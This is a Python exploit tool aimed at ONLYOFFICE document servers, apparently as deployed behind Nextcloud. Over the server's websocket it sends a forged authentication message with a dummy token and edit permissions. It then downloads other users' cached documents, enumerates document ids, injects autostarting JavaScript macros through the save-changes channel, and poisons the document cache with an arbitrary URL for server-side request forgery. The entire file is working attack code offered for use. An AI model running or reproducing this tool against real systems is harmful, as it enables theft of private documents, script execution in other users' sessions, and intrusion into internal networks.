#!/usr/bin/python3
# Exploit ONLYOFFICE implementations

import argparse, sys, re, time, signal, requests, uuid, json, tempfile, os, subprocess, websocket, base64
from urllib.parse import urlparse
import concurrent.futures

def process_fileparts( txt ):
  txt = txt.replace(r'\"','"')[3:-2]
  data = json.loads(txt)
  print(data)
  tmpdir = tempfile.mkdtemp()
  for fn, url in data['data']['data'].items():
    dest = os.path.join( tmpdir, fn )
    d = os.path.dirname(dest)
    if not os.path.isdir(d):
      print('Creating ' + d)
      os.makedirs(d)
    print('Downloading ' + fn )
    r = requests.get( url, stream=True )
    print('Writing to '+dest,end='')
    with open( dest, 'wb' ) as f:
      for chunk in r:
        print('.',end='')
        f.write(chunk)
    print(' done')
  print( 'finished downloads')
  infile = os.path.join(tmpdir,'Editor.bin')
  outfile = os.path.join(tmpdir,'document.docx')
  print('Attempting to convert ',infile,'to',outfile)
  subprocess.check_output(['x2t/x2t',infile,outfile])
  subprocess.check_output(['open',outfile])

class WsClient():

  def __init__( self, url, docid, platform ):
    
    self.docid = docid
    self.platform = platform
    self.url = url
    self.connect()

  def connect( self ):
    if self.url.startswith('http'):
      self.url = re.sub(r'^http','ws', self.url)
    
    if self.platform == 'nextcloud':
      self.url = self.url + '/ds-vpath/doc/'+self.docid+'/c/1/a/websocket'

    print( self.url )
    self.ws = websocket.create_connection( self.url )
    print( self.recv() )
    print( self.recv() )

  def send( self, message ):
    if type( message ) != str:
      # JSON containing JSON string
      message = json.dumps([json.dumps(message)])
    print(message)
    self.ws.send( message )

  def recv( self ):
    return self.ws.recv()


  def auth( self, docurl='' ):
    txt = r'["{\"type\":\"auth\",\"docid\":\"'+self.docid+r'\",\"token\":\"a\",\"user\":{\"id\":\"a\",\"username\":\"a\",\"firstname\":null,\"lastname\":null,\"indexUser\":-1},\"editorType\":0,\"lastOtherSaveTime\":-1,\"block\":[],\"sessionId\":null,\"sessionTimeConnect\":null,\"sessionTimeIdle\":0,\"documentFormatSave\":65,\"view\":false,\"isCloseCoAuthoring\":false,\"openCmd\":{\"c\":\"open\",\"id\":\"'+self.docid+r'\",\"userid\":\"a\",\"format\":\"docx\",\"url\":\"'+docurl+r'\",\"title\":\"whatever.docx\",\"lcid\":2057,\"nobase64\":false},\"lang\":null,\"mode\":null,\"permissions\":{\"edit\":true},\"IsAnonymousUser\":false}"]'
    self.send( txt )
    print( self.recv() )
    count = 1
    while count < 3:
      # print( 'Count:', count )
      result = self.recv()
      print("Received '%s'" % result)
      if 'Editor.bin' in result:
        print( 'Found docid:', self.docid )
        process_fileparts(result)
        break;
      count += 1
    

  def save_changes( self, changes ):
    # ["{\"type\":\"saveChanges\",\"changes\":\"[\\\"78;AgAAADEA//8BAH7tVXlc7AEARwEAAAEAAAACAAAAAgAAAAIAAAAEAAAABAAAABwAAAA2AC4ANAAuADEALgA0ADUALgBAAEAAUgBlAHYA\\\",\\\"670;HgAAAF8AbQBhAGMAcgBvAHMARwBsAG8AYgBhAGwASQBkAAEAAAAAAAAANgEAAHsAIgBtAGEAYwByAG8AcwBBAHIAcgBhAHkAIgA6AFsAewAiAG4AYQBtAGUAIgA6ACIATQBhAGMAcgBvAHMAIAAxACIALAAiAHYAYQBsAHUAZQAiADoAIgAoAGYAdQBuAGMAdABpAG8AbgAoACkAXABuAHsAXABuACAAIAAgACAAYQBsAGUAcgB0ACgAMgApADsAXABuAH0AKQAoACkAOwAiACwAIgBnAHUAaQBkACIAOgAiADgANQBiADUAMwA5AGEANABjADkANAAxADQAOAAzAGIAOAAxADYANgA5ADAAYgBiAGUAOAA0ADAANAA1AGYAZAAiACwAIgBhAHUAdABvAHMAdABhAHIAdAAiADoAdAByAHUAZQB9AF0ALAAiAGMAdQByAHIAZQBuAHQAIgA6ADAAfQA2AQAAewAiAG0AYQBjAHIAbwBzAEEAcgByAGEAeQAiADoAWwB7ACIAbgBhAG0AZQAiADoAIgBNAGEAYwByAG8AcwAgADEAIgAsACIAdgBhAGwAdQBlACIAOgAiACgAZgB1AG4AYwB0AGkAbwBuACgAKQBcAG4AewBcAG4AIAAgACAAIABhAGwAZQByAHQAKAAxACkAOwBcAG4AfQApACgAKQA7ACIALAAiAGcAdQBpAGQAIgA6ACIAOAA1AGIANQAzADkAYQA0AGMAOQA0ADEANAA4ADMAYgA4ADEANgA2ADkAMABiAGIAZQA4ADQAMAA0ADUAZgBkACIALAAiAGEAdQB0AG8AcwB0AGEAcgB0ACIAOgB0AHIAdQBlAH0AXQAsACIAYwB1AHIAcgBlAG4AdAAiADoAMAB9AA==\\\"]\",\"startSaveChanges\":true,\"endSaveChanges\":true,\"isCoAuthoring\":false,\"isExcel\":false,\"deleteIndex\":18,\"excelAdditionalInfo\":\"{\\\"lm\\\":\\\"oc9gn4ob06oo_admin2\\\",\\\"SYg\\\":\\\"oc9gn4ob06oo_admin\\\",\\\"wTg\\\":\\\"14;BgAAADgAMQA0AAAAAAA=\\\"}\",\"unlock\":false,\"releaseLocks\":false}"]
    message = {
      'type':'saveChanges',
      'startSaveChanges':True,
      'endSaveChanges':True,
      'isCoAuthoring':False,
      'isExcel':False,
      'changes':json.dumps(changes),
      'deleteIndex': 1,
      'excelAdditionalInfo':json.dumps({
        'lm':'admin',
        'SYg':'admin',
        'wTg':'14;BgAAADgAMQA0AAAAAAA='
      }),
      'unlock':False,
      'releaseLocks':False
    }
    self.send( message )
    while True:
      print( self.recv() )


  def inject_macro( self, macrotxt ):
    # _macrosGlobalId6{"macrosArray":[{"name":"Macros 1","value":"(function()\n{\n    alert(2);\n})();","guid":"85b539a4c941483b816690bbe84045fd","autostart":true}],"current":0}6{"macrosArray":[{"name":"Macros 1","value":"(function()\n{\n    alert(1);\n})();","guid":"85b539a4c941483b816690bbe84045fd","autostart":true}],"current":0}
    payload = json.dumps({
      "macrosArray":[{
        "name":"Macro 1",
        "value":macrotxt,
        "guid": str(uuid.uuid4()).replace('-',''),
        "autostart": True
      }],
      "current":0
    })

    data = b'\x1e\x00\x00\x00' + '_macrosGlobalId'.encode('utf16') + b'\x01\x00\x00\x00\x00\x00\x00' +len(payload).to_bytes(2,byteorder='big')+b'\x00\x00' +payload.encode('utf16')
    changes = [str(len(data))+';'+base64.b64encode(data).decode('utf8')]
    self.save_changes( changes )


def main():
  parser = argparse.ArgumentParser(description="ONLYOFFICE exploitation tool")
  parser.add_argument('-u', '--url', help='Base URL of the site running ONLYOFFICE')
  parser.add_argument('-d', '--docid', help='id of the document')
  parser.add_argument('-D', '--docurl', help='Document URL to download to OO cache for the current docid (SSRF, unix: pipes supported)', default='')
  parser.add_argument('-p', '--platform', default='nextcloud', help='What the underlying platform is')
  subparsers = parser.add_subparsers(dest='command')

  # TODO: Start a separate thread to handle received websocket messages

  # Download
  dlparse = subparsers.add_parser('dl')

  # Inject macro
  injparse = subparsers.add_parser('macro')
  injparse.add_argument('script', help='Javascript file to inject into document')

  # Enumerate cached doc ids
  enumparse = subparsers.add_parser('enum')
  enumparse.add_argument('docids', help='text file containing doc ids to test')

  args = parser.parse_args()

  if not args.command or not args.url or ( args.command != 'enum' and not args.docid ) or ( args.command == 'enum' and not args.docids ):
    parser.print_help()
    sys.exit(2)

  # Document enumeration
  if args.command == 'enum':
    with open( args.docids, 'r' ) as f:
      for line in f.readline():
        docid = line.strip()
        client = WsClient( args.url, docid, args.platform )
        client.auth()
    sys.exit(0)

  client = WsClient( args.url, args.docid, args.platform )

  # Macro injection
  if args.command == 'macro':
    with open(args.script, 'r') as f:
      client.auth()
      client.inject_macro(f.read())

  # Poison document cache with external URL
  # SSRF
  if args.command == 'dl':
    client.auth( args.docurl )




if __name__ == '__main__':
  main()
